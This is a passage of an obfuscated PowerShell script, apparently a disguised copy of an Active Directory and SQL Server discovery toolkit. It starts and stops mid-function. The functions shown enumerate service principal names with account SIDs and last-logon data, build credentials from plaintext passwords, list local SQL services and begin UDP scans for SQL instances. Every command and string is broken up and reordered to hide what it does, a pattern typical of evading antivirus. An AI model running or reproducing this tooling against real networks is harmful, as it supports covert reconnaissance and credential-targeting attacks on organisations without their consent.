                ${sp`NF`iLTer} = "(objectcategory=person)(SamAccountName=$DomainAccount)"
            }

            if(${C`OmPuTEr`Name})
            {
                ${coMP`UTeRSE`A`R`CH} = "$ComputerName`$"
                ${sp`N`FILTeR} = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }

            
            ${S`Pn`RES`Ults} = &("{5}{0}{2}{1}{4}{3}" -f 'Domain','e','Obj','t','c','Get-') -LdapFilter "(&(servicePrincipalName=$SpnService*)$SpnFilter)" -DomainController ${Do`mA`INCo`Nt`Ro`lLER} -Username ${USeR`N`AME} -Password ${P`AsswORd} -Credential ${C`Re`DeN`Tial}

            
            ${s`PN`REsUltS} | &("{1}{2}{0}{3}" -f 'e','ForEach','-Obj','ct') -Process {
                [string]${sID`BYT`es} = [byte[]]"$($_.Properties.objectsid)".("{0}{1}" -f 's','plit').Invoke(' ')
                [string]${S`iDs`TRing} = ${s`Id`ByteS} -replace ' ', ''
                

                
                foreach (${i`Tem} in $(${_}."prop`Ert`iES"."sE`R`VICEp`RINCiPAlN`Ame"))
                {
                    
                    ${SpN`se`Rver} = ${I`TeM}.("{1}{0}"-f't','spli').Invoke('/')[1].("{1}{0}"-f'lit','sp').Invoke(':')[0].("{1}{0}"-f'lit','sp').Invoke(' ')[0]
                    ${S`pNserv`iCE} = ${iT`EM}.("{0}{1}"-f 'spli','t').Invoke('/')[0]

                    
                    if (${_}."pROp`e`RtiES"."L`As`TlOGOn")
                    {
                        ${LA`sTLO`GoN} =   $fAyGr3::"fROMFil`e`T`iME"([string]${_}."pR`o`pERTIEs"."la`Stl`oGON").("{1}{2}{0}"-f 'ring','ToS','t').Invoke('g')
                    }
                    else
                    {
                        ${lASTl`Og`on} = ''
                    }

                    
                    ${NU`lL} = ${TA`BlE`DoM`AinSPN}."r`OWs"."A`Dd"(
                        [string]${s`iDS`TRING},
                        [string]${_}."PROpEr`T`ieS"."S`AM`ACCo`Unt`NAME",
                        [string]${_}."p`RoP`Er`TIEs"."c`N",
                        [string]${spn`sER`ViCe},
                        [string]${sp`NseR`VER},
                        [string]${iT`em},
                        ${L`A`st`LOgon},
                        [string]${_}."pr`oPERT`iES"."deSCr`IPtI`on"
                    )
                }
            }
        }
        catch
        {
            ('E'+'rr'+'or '+'wa'+'s '+"$_")
            ${LI`NE} = ${_}."I`Nvo`c`ATio`NINfo"."sc`RiPtL`iNE`NUMB`ER"
            ('Error'+' '+'wa'+'s '+'i'+'n '+'Lin'+'e '+"$line")
        }
    }

    End
    {
        
        if (${taB`L`e`DOMain`SPn}."R`Ows"."cOU`Nt" -gt 0)
        {
            ${T`AbleDoM`AINS`p`NC`oUnT} = ${TaBLEDOM`Ain`s`PN}."RO`Ws"."C`ount"
            if(-not ${SUPpR`Ess`VErbOse})
            {
                &("{0}{1}{2}" -f 'Wri','te-V','erbose') -Message ("$TableDomainSpnCount "+'S'+'PNs '+'found'+' '+'on'+' '+'s'+'e'+'rvers '+'that'+' '+'matche'+'d'+' '+'s'+'earch'+' '+'criteri'+'a.')
            }
            Return ${t`A`BLedOMa`iN`Spn}
        }
        else
        {
            &("{3}{0}{1}{2}" -f 'i','te','-Verbose','Wr') -Message ("{2}{1}{3}{0}"-f 'd.','SPNs fo','0 ','un')
        }
    }
}







function G`Et-DOm`AInob`J`ect
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAnDAtOry = ${f`ALSE},
        HElPmeSsAgE = {(("{4}{8}{1}{7}{5}{3}{6}{2}{9}{10}{11}{13}{0}{12}"-f'ser','to a','th','w','Domain','henticate ','i','ut',' user ',' do','mainj','f','.','6u'))  -CRePlACE([cHar]106+[cHar]102+[cHar]54),[cHar]92})]
        [string]${U`sEr`NAme},

        [Parameter(ManDatORY = ${fAL`sE},
        hELpmessage = {(("{13}{6}{10}{3}{2}{7}{12}{5}{9}{1}{4}{8}{11}{0}"-f 'er.','o','to','d ','ma','ate',' pas',' au','in{0}',' with d','swor','us','thentic','Domain')) -F  [ChAr]92})]
        [string]${P`A`sSwOrD},

        [Parameter(MAndatoRy = ${fA`lse},
        heLpMESSAgE = {"{14}{10}{1}{0}{6}{7}{8}{11}{3}{5}{9}{12}{13}{4}{2}"-f 's to use wh','l','.',' a Do','roller','ma','en ','connec','tin','in ','redentia','g to','Co','nt','C'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRe`DenT`I`AL} =   (  vAriAblE ('04'+'59m2')).VaLue::"EmP`TY",

        [Parameter(mAnDAtOry = ${fal`SE},
        heLpmessAgE = {"{5}{2}{1}{10}{9}{7}{4}{0}{6}{8}{3}" -f'to ','nd',' a',' against.','t ','Domain controller for Domain','quer','wan','y',' you ',' Site that'})]
        [string]${d`om`AIn`ConTrOL`ler},

        [Parameter(mandAtOry = ${FA`l`Se},
        hELpmeSSAge = {"{2}{0}{1}" -f'A','P Filter.','LD'})]
        [string]${Ld`A`Pf`ilTEr} = '',

        [Parameter(MAndAToRy = ${faL`Se},
        HElpmESsaGE = {"{2}{1}{0}"-f 'h.',' pat','LDAP'})]
        [string]${lDaPP`A`TH},

        [Parameter(maNDATORY = ${fAL`Se},
        heLpmeSSAge = {"{4}{5}{0}{9}{8}{2}{6}{3}{11}{7}{10}{1}" -f'm nu','.','of Obj','ull ','Max','imu','ects to p','is 1,0','r ','mbe','00 ','from AD, limit '})]
        [int]${Lim`it} = 1000,

        [Parameter(maNdatoRY = ${faL`Se},
        HelPmeSSagE = {"{9}{16}{14}{3}{4}{10}{15}{11}{5}{2}{1}{18}{17}{0}{8}{12}{6}{13}{7}" -f'h, def','ree ','ubt',' ','as either ',', or s','is ','tree.','a','sc','a b',', one-level','ult ','sub','h','ase','ope of a searc','rc','sea'})]
        [ValidateSet({"{0}{2}{1}"-f 'Subt','ee','r'},{"{0}{1}{2}" -f 'OneL','ev','el'},{"{0}{1}"-f 'Ba','se'})]
        [string]${S`ea`RcH`ScOPe} = ("{0}{2}{1}"-f'Sub','e','tre')
    )
    Begin
    {
        
        if(${UsER`NaMe} -and ${pASS`W`ord})
        {
            ${S`ecpa`sS} = &("{2}{1}{3}{0}"-f'ring','cur','ConvertTo-Se','eSt') ${p`ASS`WoRD} -AsPlainText -Force
            ${Cre`Den`TIAL} = &("{0}{2}{1}"-f'New','ect','-Obj') -TypeName ("{7}{4}{8}{3}{10}{6}{5}{1}{11}{9}{0}{2}" -f'a','n.PSCred','l','n','m.Man','omatio','.Aut','Syste','ageme','ti','t','en') -ArgumentList (${uS`eRnA`Me}, ${S`ecp`AsS})
        }

        
        if (${D`o`mA`inC`ontrO`LleR})
        {
           
            
            try {

                ${ar`gU`men`TLI`ST} = &("{0}{1}{2}"-f'New-','Objec','t') ("{6}{0}{9}{8}{3}{5}{4}{1}{2}{7}"-f 'llection','in','g','s','[str','t','Co',']','Li','s.Generic.')
                ${aRG`UM`ent`LI`St}.("{0}{1}" -f 'Ad','d').Invoke("LDAP://$DomainController")

                if(${U`s`ERNAMe}){
                    ${a`R`gUmenTli`ST}.("{1}{0}" -f'dd','A').Invoke(${CRED`e`NtIAL}."US`ERN`AME")
                    ${aR`G`U`mEn`TLiST}.("{1}{0}"-f'd','Ad').Invoke(${C`Red`ENTI`Al}.("{0}{3}{1}{5}{2}{4}"-f'G','rkCred','tia','etNetwo','l','en').Invoke()."PASswO`Rd")
                }

                ${obJ`d`Omain} = (&("{2}{1}{3}{0}" -f'ect','ew','N','-Obj') -TypeName ("{5}{0}{4}{6}{2}{1}{3}" -f'y','tr','toryEn','y','Services','System.Director','.Direc') -ArgumentList ${ArGUmE`NtL`i`ST})."D`IsTIn`Gu`iSHedNAme"

                
                if(-not ${oBJ`Dom`AIn}){ throw }

            }catch{
                &("{1}{0}{2}" -f'te-Ho','Wri','st') ("{0}{9}{12}{6}{10}{1}{8}{7}{11}{2}{3}{5}{4}{13}"-f'Authe','or','is',' ','ot reacha','n','n ','domain contr',' ','nti','failed ','oller ','catio','ble.')
                Break
            }

            
            if(${Lda`PPa`Th})
            {
                ${LdaPp`ATh} = '/'+${LDA`PpatH}+','+${o`BjD`Om`AIN}
                ${arg`UMENtLi`ST}[0] = "LDAP://$DomainController$LdapPath"
            }

            ${O`Bj`dO`MAIn`pAth}= &("{0}{2}{1}{3}"-f'N','O','ew-','bject') ("{0}{5}{3}{2}{1}{9}{6}{10}{11}{7}{8}{4}" -f 'Sys','e','S','ctory','ntry','tem.Dire','s.','ry','E','rvice','Direct','o') -ArgumentList ${AR`g`Um`ENtlISt}

            ${OBJs`E`A`RCher} = &("{1}{2}{0}" -f '-Object','Ne','w') -TypeName ("{4}{5}{2}{1}{0}{7}{8}{9}{6}{3}" -f'.','ices','oryServ','r','System.','Direct','ySearche','Di','re','ctor') ${ob`jdomAinPA`TH}
        }
        else
        {
            ${o`Bjd`oMA`In} = ([ADSI]'')."diST`INGUish`EdN`A`ME"

            
            if(${LD`AP`p`ATH})
            {
                ${ld`A`pPATh} = ${LD`A`PpAth}+','+${o`BjDOM`AIn}
                ${o`BJDom`AINpATH}  = [ADSI]"LDAP://$LdapPath"
            }
            else
            {
                ${ObJDoMA`I`NpA`Th}  = [ADSI]''
            }

            ${OBJs`eArC`h`er} = &("{3}{2}{1}{0}"-f 'ect','j','Ob','New-') -TypeName ("{4}{1}{9}{2}{3}{0}{11}{6}{12}{5}{10}{7}{8}"-f'i','ystem.Di','ectory','Serv','S','ctoryS','s.Dir','arch','er','r','e','ce','e') -ArgumentList ${oBJDO`MaIN`PaTh}
        }

        
        ${OBJse`A`RCHEr}."PAg`ES`iZE" = ${L`imIT}
        ${objsE`Ar`cHER}."fi`lT`Er" = ${LD`ApF`i`LTer}
        ${Obj`SeA`RC`hER}."s`eARCHSC`OPE" = ("{0}{1}{2}"-f 'S','ub','tree')
    }

    Process
    {
        try
        {
            
            ${obJ`S`E`ArChER}.("{0}{2}{1}"-f'F','dAll','in').Invoke() | &("{3}{0}{2}{1}"-f 'orEa','ct','ch-Obje','F') -Process {
                ${_}
            }
        }
        catch
        {
            ('Er'+'ror '+'w'+'as '+"$_")
            ${li`Ne} = ${_}."I`NvocA`Ti`ONIN`FO"."s`crI`pT`LInenumB`Er"
            ('E'+'r'+'ror '+'wa'+'s '+'in'+' '+'L'+'ine '+"$line")
        }
    }

    End
    {
    }
}





Function  GeT`-`SQ`LiNs`TAncEDOM`AiN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNDATory = ${FA`lse},
        hELpMesSAGE = {(("{2}{7}{10}{4}{1}{9}{6}{12}{0}{8}{5}{11}{3}"-f 'with ','au','Domain ','guser.',' ','m','enticate','user t','do','th','o','ainZm',' '))-crePlACE  'Zmg',[chAr]92})]
        [string]${uSeRn`A`me},

        [Parameter(MANDatory = ${FaL`se},
        hElPMESSAGE = {(("{9}{5}{0}{2}{1}{7}{10}{4}{8}{6}{3}"-f 'passw','to a','ord ','er.','h domaineG',' ','s','uthenticat','Hu','Domain','e wit'))."r`E`PLACE"(([ChAr]101+[ChAr]71+[ChAr]72),'\')})]
        [string]${P`ASs`W`oRd},

        [Parameter(MAndAtORy = ${Fa`lSe},
        HelPMesSAgE = {"{0}{8}{14}{12}{10}{4}{9}{5}{6}{16}{11}{13}{1}{2}{15}{7}{3}" -f 'Crede','C','ont','ller.','nnect','o a',' Do','o','nti','ing t',' when co','a','e','in ','als to us','r','m'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`Re`Dential} =   $0459M2::"emp`Ty",

        [Parameter(MAndATory = ${f`AL`sE},
        HeLpmEssAGe = {"{4}{14}{6}{3}{0}{8}{10}{12}{7}{9}{2}{5}{1}{13}{11}"-f ' ','g','nt to query','ler','Doma',' a','rol','e t','fo','hat you wa','r Domain and','t.',' Sit','ains','in cont'})]
        [string]${doMai`NContRo`l`LEr},

        [Parameter(MANdAtoRy = ${fa`lSe},
                vaLuEfrompIPelIne = ${Tr`Ue},
                vAluEFrOMpIPElinEbYpRoPErtynAmE = ${TR`UE},
        HelpMEssAGe = {"{1}{4}{0}{3}{2}"-f'me to ','Co','r.','filter fo','mputer na'})]
        [string]${com`PUTer`N`AME},

        [Parameter(mAndAToRY = ${f`AL`Se},
                valuEfrOmPiPelINE = ${tR`Ue},
                vAlUEFROMPipeLInebypropeRtYnAmE = ${T`Rue},
        hELpmesSagE = {"{3}{0}{6}{1}{2}{4}{5}{7}" -f 'co','t ','to filt','Domain ac','er',' for','un','.'})]
        [string]${d`OmaI`N`ACCOunt},

        [Parameter(MaNdATOrY = ${F`AlsE},
                valUEfrOmPiPelInEBYpropertYName = ${TR`UE},
        hELPMeSSaGe = {"{2}{0}{12}{14}{13}{4}{15}{11}{9}{1}{7}{3}{10}{6}{5}{8}" -f 'ms U',' s','Perfor','ng','n','er ',' Serv','ervers managi','clusters.','f',' SQL','o','DP ','a','sc',' '})]
        [switch]${ChE`cKM`GMt},

        [Parameter(MANdaToRy = ${f`A`lsE},
                ValUefRoMPIPeLINeBypropERTynAMe = ${Tr`UE},
        HELpmEssage = {"{3}{7}{6}{10}{9}{5}{0}{1}{2}{4}{8}"-f 'on',' th','e i','Pr','nst','DNS lookup ','fo','e','ance.',' ','rms a'})]
        [switch]${i`NC`ludeIp},

        [Parameter(MandaToRy = ${F`ALse},
                vaLuefroMpiPElINEByPRopeRtynAME = ${T`RUe},
        helPMEsSaGe = {"{11}{12}{4}{7}{3}{2}{1}{0}{6}{8}{10}{13}{9}{5}"-f 'rvers. ',' se','ans of management','P sc','econ','te.','Longer','ds for UD',' time','ura','out = ','Time','out in s','more acc'})]
        [int]${u`dpTIM`E`Out} = 3
    )

    Begin
    {
        
        ${tBLs`qLSe`RV`eRs`pNs} = &("{1}{2}{0}" -f'bject','New','-O') -TypeName ("{0}{2}{3}{4}{1}"-f 'Syste','able','m','.D','ata.DataT')
        ${n`ULl} = ${tb`LS`qlSerV`ERsP`Ns}."c`olUMNS".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{2}" -f 'Com','puterN','ame'))
        ${n`Ull} = ${t`BlsQlS`erVe`RSpns}."C`o`lumns".("{1}{0}" -f 'dd','A').Invoke(("{1}{0}"-f 'ance','Inst'))
        ${NU`Ll} = ${T`Bls`QlSE`RvErS`PNS}."Co`Lum`NS".("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{2}{1}"-f'AccountS','d','i','Domain'))
        ${nu`Ll} = ${TBLs`q`l`sERvERsp`NS}."cO`LUM`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}"-f'Doma','inAc','count'))
        ${n`ULL} = ${TBLs`qL`sE`RveRs`pNS}."col`UMns".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{3}{1}" -f 'Doma','untCn','inA','cco'))
        ${N`Ull} = ${Tb`l`S`qLseRvEr`SpNS}."Colu`MnS".("{1}{0}" -f'dd','A').Invoke(("{1}{0}" -f'rvice','Se'))
        ${Nu`ll} = ${tbLsqLs`ErV`E`RSPNS}."c`Ol`UMNS".("{1}{0}" -f 'd','Ad').Invoke('Spn')
        ${Nu`LL} = ${TBLS`Q`lSER`VERSPNs}."Co`Lumns".("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}"-f 'ast','L','Logon'))
        ${nU`LL} = ${T`BLs`q`l`sEr`VERspns}."COL`UMNS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{0}{2}" -f 'ti','Des','on','crip'))

        if(${i`NcLU`DEIP})
        {
            ${n`Ull} = ${tB`lSQLS`e`Rv`ErS`PNs}."cOl`UMns".("{1}{0}" -f'dd','A').Invoke(("{2}{1}{0}" -f 's','res','IPAdd'))
        }
        
    }

    Process
    {
        
        &("{0}{4}{3}{2}{1}"-f'Wri','se','-Verbo','e','t') -Message ("{0}{3}{7}{12}{8}{10}{11}{6}{14}{13}{4}{15}{1}{2}{5}{9}"-f 'G','L Ser','vers (MSS','rabb','S','Q',' d','in',' SPNs','L*)...',' from t','he','g','ain for ','om','Q')
        ${tb`l`sqLserV`ERS} = &("{2}{3}{0}{1}{4}"-f 'Do','ma','G','et-','inSpn') -DomainController ${dOm`AinCON`Tr`olLEr} -Username ${USEr`NA`Me} -Password ${pass`Wo`Rd} -Credential ${c`REDenT`Ial} -ComputerName ${ComP`UteRnA`Me} -DomainAccount ${d`OMAI`N`Ac`cOuNT} -SpnService ("{1}{0}"-f 'L*','MSSQ') -SuppressVerbose | &("{1}{2}{0}{3}"-f 'Obj','Where','-','ect') -FilterScript {
            ${_}."seRvi`cE" -like ("{0}{1}" -f 'MSSQL','*')
        }

        &("{3}{0}{2}{1}"-f 'Ve','bose','r','Write-') -Message ("{11}{8}{7}{9}{2}{0}{4}{3}{6}{10}{12}{5}{1}" -f 'tan','.',' ins','s fro','ce','s..','m','g SQL','in',' Server',' ','Pars','SPN')

        
        ${TblSq`LSe`R`V`Ers} |
        &("{3}{0}{2}{1}"-f'Eac','ect','h-Obj','For') -Process {
            
            ${S`PN} = ${_}."S`pN"
            ${iN`S`TaNcE} = ${s`PN}.("{1}{0}"-f'plit','s').Invoke('/')[1].("{0}{1}"-f'spli','t').Invoke(':')[1]

            
            ${VA`lue} = 0
            if( (  variabLe ("EhXa"+"N4") ).valUE::"tRyp`AR`SE"(${INsT`A`Nce},[ref]${vaL`UE}))
            {
                ${Sp`NseRVE`R`INS`TANce} = ${s`pN} -replace ':', ','
            }
            else
            {
                ${SPnSE`RVeRin`STA`NcE} = ${S`pN} -replace ':', '\'
            }

            ${spN`sERvE`RI`N`stancE} = ${Sp`NS`erVer`i`NstANcE} -replace ("{2}{0}{1}"-f 'S','SQLSvc/','M'), ''

            ${t`ABL`Erow} = @([string]${_}."CoMPU`TE`R`Name",
                [string]${SPNsER`VeRI`NS`T`A`NCE},
                ${_}."u`SerSiD",
                [string]${_}."U`ser",
                [string]${_}."USeR`Cn",
                [string]${_}."SE`R`Vice",
                [string]${_}."S`Pn",
                ${_}."L`AsTLog`ON",
                [string]${_}."dEScri`PTI`On")

            if(${in`Clu`DeIp})
            {
                try 
                {
                    ${I`pa`ddREsS} =  ( gET-ItEM ('vAr'+'IA'+'BLE:Hc'+'9') ).vAlUe::"G`ETHO`StA`dDreSS`ES"([String]${_}."Co`mputeR`N`AMe")."Ipad`d`ReSstOst`Ri`Ng"
                    if(${I`PAdDre`SS} -is [Object[]])
                    {
                        ${IP`AD`dreSS} = ${ipA`d`dreSS} -join ", "
                    }
                }
                catch 
                {
                    ${iP`Ad`DRe`SS} = ("{0}{1}"-f'0','.0.0.0')
                }
                ${Ta`B`LErow} += ${i`PA`dDR`ess}
            }

            
            ${Nu`LL} = ${T`Bls`qLseRvE`RSpNS}."R`OwS".("{0}{1}" -f 'A','dd').Invoke(${t`ABLeR`ow})
        }

        
        if(${Ch`EC`Kmg`mT})
        {
            &("{0}{1}{2}{3}" -f'Wr','ite-','Verb','ose') -Message ("{2}{11}{19}{13}{8}{22}{25}{16}{15}{17}{5}{14}{10}{9}{26}{21}{12}{1}{23}{18}{4}{7}{20}{3}{0}{24}{6}"-f'mt','e','Gr','verClusterMg','clu','rvers ','...','sters (','om ','a','n','abbing ',' SQL S','fr','ma',' ',' for','Se','ver ','SPNs ','MSSer','ing','the d','r','API)','omain','g')
            ${tblMg`mT`s`ER`VerS} = &("{2}{0}{1}" -f'Sp','n','Get-Domain') -DomainController ${D`OMA`Inco`NTroLleR} -Username ${U`SeRn`AMe} -Password ${PAsSw`o`RD} -Credential ${c`R`eDeNTiaL}  -ComputerName ${c`OmP`UTer`NAme} -DomainAccount ${dO`MaInACc`o`U`NT} -SpnService ("{0}{5}{1}{3}{4}{2}"-f 'MS','rverCl','tAPI','u','sterMgm','Se') -SuppressVerbose |
            &("{1}{2}{0}" -f'Object','Whe','re-') -FilterScript {
                ${_}."CoMpuTer`N`Ame" -like '*.*'
            } |
            &("{4}{3}{2}{1}{0}" -f'bject','-O','ect','l','Se') -Property ("{3}{2}{0}{1}"-f 'am','e','N','Computer') -Unique |
            &("{3}{2}{1}{0}" -f't','Objec','ort-','S') -Property ("{2}{1}{0}{3}"-f 'a','uterN','Comp','me')

            &("{0}{1}{2}{3}"-f 'W','rite-Verb','o','se') -Message ("{16}{23}{12}{2}{3}{20}{14}{13}{19}{0}{6}{5}{7}{11}{22}{15}{8}{4}{1}{21}{10}{17}{18}{9}" -f'rv','SQL ','U','D','ged ','to ob','ers ','ta','na','ances...','e','i','g a ','f managem',' o','ma','Perform','r',' inst','ent se','P scan','Serv','n ','in')
            ${tB`LmgmTSq`l`ServE`Rs} = ${T`BLm`GMtsER`VErs} |
            &("{3}{0}{1}{2}" -f 'Ob','je','ct','Select-') -Property ("{2}{1}{3}{0}" -f'terName','o','C','mpu') -Unique |
            &("{3}{0}{2}{1}{4}"-f'QL','nceScanUD','Insta','Get-S','P') -UDPTimeOut ${UDP`TiMEo`UT}
        }
    }

    End
    {
        
        if(${c`hEckM`G`MT})
        {
            &("{3}{1}{4}{0}{2}" -f'bos','Ve','e','Write-','r') -Message ("{7}{10}{3}{5}{9}{1}{4}{12}{6}{0}{2}{8}{11}" -f's','ver i',' ','i','ns','ng','ance','P','from the UDP scan',' SQL Ser','ars','...','t')
            ${T`BL1} = ${t`BL`M`GM`Tsq`LsErvERs} |
            &("{3}{0}{1}{2}" -f 'elect-Obj','e','ct','S') -Property ("{2}{1}{0}" -f 'ame','erN','Comput'), ("{1}{2}{0}" -f 'e','Inst','anc') |
            &("{2}{1}{3}{0}" -f 'ect','ort-O','S','bj') -Property ("{0}{1}{2}{3}" -f'C','om','pu','terName'), ("{0}{2}{1}"-f'Inst','ce','an')
            ${T`BL2} = ${T`BLsQlS`er`Ve`R`sPnS} |
            &("{1}{3}{0}{2}" -f'Obj','Sel','ect','ect-') -Property ("{3}{2}{1}{0}"-f'ame','uterN','omp','C'), ("{1}{0}{2}"-f 'stanc','In','e') |
            &("{0}{2}{1}{3}"-f'So','t-Objec','r','t') -Property ("{0}{1}{2}"-f'Co','mputer','Name'), ("{0}{2}{1}" -f'I','ance','nst')
            ${tb`l3} = ${TB`l1} + ${t`Bl2}

            ${in`STanCeCou`Nt} = ${Tb`l3}."r`oWS"."c`oUNT"
            &("{0}{2}{1}" -f 'Write','bose','-Ver') -Message ("$InstanceCount "+'instanc'+'e'+'s '+'were'+' '+'fou'+'nd'+'.')
            ${tb`l3}
        }
        else
        {
            ${INs`TA`N`CEcouNT} = ${T`BLSQ`L`sE`RVERSpnS}."Ro`ws"."c`OuNT"
            &("{3}{0}{1}{2}"-f 'te','-Verbos','e','Wri') -Message ("$InstanceCount "+'ins'+'ta'+'nces'+' '+'we'+'re '+'f'+'ound.')
            ${tB`lsqlseR`V`Er`sPns}
        }
    }
}






Function  g`e`T-`Sql`inSTaNcelOcal
{
    
    Begin
    {
        
        ${tblL`O`cALin`Sta`NceS} = &("{1}{3}{2}{0}" -f 'ject','New-','b','O') -TypeName ("{3}{4}{1}{0}{2}{5}" -f'ta.DataT','Da','ab','Sy','stem.','le')
        ${N`ULl} = ${T`Bl`lO`cA`LinSTa`NcEs}."C`O`lumnS".("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}"-f 'erName','Compu','t'))
        ${Nu`lL} = ${TBlLo`CaL`iNS`Ta`NCeS}."COL`U`MNS".("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}"-f't','Ins','ance'))
        ${N`ULL} = ${tB`lLocALInST`ANc`es}."C`OlumnS".("{1}{0}"-f 'dd','A').Invoke(("{1}{3}{4}{0}{2}" -f 'layNa','Se','me','r','viceDisp'))
        ${N`Ull} = ${t`BLLo`ca`lINStances}."C`ol`Umns".("{0}{1}" -f'Ad','d').Invoke(("{2}{3}{1}{0}"-f'e','Nam','Serv','ice'))
        ${N`ULl} = ${T`BL`LO`CaliN`ST`AnCEs}."CO`LuMnS".("{0}{1}" -f'A','dd').Invoke(("{3}{1}{2}{0}"-f'ath','vic','eP','Ser'))
        ${NU`LL} = ${tbl`LoCA`LINST`AnCes}."colu`mns".("{1}{0}"-f 'dd','A').Invoke(("{1}{3}{2}{0}" -f 'nt','Ser','eAccou','vic'))
        ${N`ULL} = ${tB`LlOcal`In`sTAN`ceS}."Co`lu`mns".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f 'ate','St'))
    }

    Process
    {
        
        ${sqLS`e`RV`ICEs} = &("{5}{1}{3}{2}{6}{0}{4}" -f 'c','e','-SQLSe','t','eLocal','G','rvi') | &("{2}{3}{1}{0}"-f 'ct','je','Where','-Ob') -FilterScript {
            ${_}."ser`VIC`ePaTh" -like ("{2}{1}{3}{0}"-f '.exe*','qlser','*s','vr')
        }

        
        ${S`QlserV`i`CES} |
        &("{3}{4}{0}{2}{1}"-f'ch','Object','-','Fo','rEa') -Process {
            
            ${C`o`MP`U`TERNaMe} = [string]${_}."COMPuTE`Rn`AMe"
            ${dI`SPLAY`Na`me} = [string]${_}."ServIcEDiS`pL`A`Y`NAME"

            if(${DIS`pl`AYNa`Me})
            {
                ${I`N`StaNCE} = ${CO`M`put`er`NAMe} + '\' +${Di`S`pLAYna`Me}.("{1}{0}"-f 'it','spl').Invoke('(')[1].("{0}{1}" -f's','plit').Invoke(')')[0]
                if(${INSTA`N`cE} -like ((("{3}{1}{4}{0}{2}"-f 'RV','{','ER','*','0}MSSQLSE'))  -F [chAR]92))
                {
                    ${i`NS`Tance} = ${cOmP`U`TErNAME}
                }
            }
            else
            {
                ${IN`sTAN`ce} = ${c`OMpU`T`ernaME}
            }

            
            ${n`Ull} = ${tBL`l`OCAlInSTAn`ceS}."r`ows"."A`dD"(
                [string]${_}."c`OMPUte`R`NAmE",
                [string]${INs`T`ANCE},
                [string]${_}."ServiC`ED`iSPlay`N`AmE",
                [string]${_}."SE`RVICe`N`Ame",
                [string]${_}."se`Rv`iCepAth",
                [string]${_}."S`eRViCE`AcCOUnt",
            [string]${_}."sErVIC`e`St`ATE")
        }
    }

    End
    {

        
        ${lo`CaLinST`ANc`e`Co`Unt} = ${T`BLl`OcA`li`NSTa`Nces}."ro`wS"."CO`UnT"
        &("{0}{3}{4}{1}{2}" -f'Writ','b','ose','e','-Ver') -Message ("$LocalInstanceCount "+'loca'+'l '+'instan'+'c'+'es '+'whe'+'re '+'foun'+'d.')

        
        ${t`BllOcalI`NST`ANcEs}
    }
}







function GE`T-Sqlin`st`A`NCEsCAnu`dP
{
    
    [CmdletBinding()]
    param(

        [Parameter(MandatOry = ${tR`UE},
                ValuefroMPIpeLine = ${TR`UE},
                valueFrOmPIPELiNEbYproPErtyNaME = ${T`RUe},
        hElPMESsAgE = {"{1}{9}{7}{5}{8}{10}{11}{6}{0}{4}{2}{3}"-f 'ss to en','C','L Instance ','from.','umerate SQ','r','P addre','te',' name ','ompu','or',' I'})]
        [string]${coM`P`UTe`RNaMe},

        [Parameter(manDatory = ${F`Al`SE},
                VaLUefroMPiPElInEbyprOpERtynAmE = ${tR`Ue},
        heLPMeSsAgE = {"{8}{4}{1}{5}{6}{3}{7}{2}{0}" -f 'te.','out in seco','ra','meout = mo','e','nds. Lo','nger ti','re accu','Tim'})]
        [int]${U`dptIME`OUT} = 2,

        [Parameter(MANDatoRY = ${F`AlsE},
        heLpmesSagE = {"{11}{7}{14}{3}{4}{2}{10}{13}{6}{1}{5}{12}{0}{9}{8}{15}"-f 'fu','d ','s','e','rbo','when','rors.  Use','upp','n is wrappe','nctio','e ','S',' ','er','ress v','d.'})]
        [switch]${SuP`presSvE`Rb`O`Se}
    )

    Begin
    {
        
        ${T`Abl`eres`ULTs} = &("{2}{0}{1}" -f '-','Object','New') -TypeName ("{4}{6}{3}{1}{0}{2}{5}" -f'.Dat','.Data','aT','em','sys','able','t') -ArgumentList ("{0}{1}" -f'Tab','le')
        ${NU`lL} = ${tAB`LerES`UlTs}."co`lUm`NS".("{1}{0}" -f'd','ad').Invoke(("{0}{1}{2}" -f 'Compute','rNam','e'))
        ${n`ULL} = ${T`AblEReSul`TS}."CoLU`mNs".("{1}{0}" -f'd','ad').Invoke(("{0}{1}" -f'Insta','nce'))
        ${NU`LL} = ${T`Ab`LErES`U`LTS}."c`OLu`mNS".("{1}{0}"-f 'dd','a').Invoke(("{3}{0}{2}{1}"-f'e','e','Nam','Instanc'))
        ${nu`lL} = ${TAbl`ereS`UlTS}."C`OlUmnS".("{1}{0}"-f 'dd','a').Invoke(("{1}{2}{0}" -f 'IP','Serv','er'))
        ${N`Ull} = ${taBL`ErEs`Ults}."cOl`Um`Ns".("{1}{0}"-f 'dd','a').Invoke(("{0}{2}{1}" -f'TCP','ort','P'))
        ${Nu`ll} = ${TA`B`lERe`SU`lts}."COLuM`Ns".("{1}{0}"-f'd','ad').Invoke(("{0}{1}{2}"-f 'BaseVersi','o','n'))
        ${n`UlL} = ${T`ABlere`su`lTs}."CoLU`mNs".("{0}{1}"-f 'ad','d').Invoke(("{1}{3}{0}{2}" -f'uster','IsC','ed','l'))
    }

    Process
    {
        if(-not ${s`UPP`R`e`ssveRBoSe})
        {
            &("{3}{1}{2}{0}"-f 'rbose','it','e-Ve','Wr') -Message (' '+'- '+"$ComputerName "+'- '+'UDP'+' '+'Scan'+' '+'Sta'+'rt'+'.')
        }

        
        if (${com`PUte`R`NAmE} -ne '')
        {
            
            try
            {
                
                ${I`PAddR`Ess} =  ( vARIABLE QvnJ6  -valueONLY)::("{0}{1}{3}{2}{4}"-f 'GetH','o','s','stAddre','ses').Invoke(${CoM`P`U`Te`RNAME})

                
                ${U`dpcL`Ie`Nt} = &("{0}{2}{1}" -f'New-O','t','bjec') -TypeName ("{4}{5}{1}{3}{0}{6}{2}"-f 'Sock','e','ent','m.Net.','Sy','st','ets.Udpcli')

                
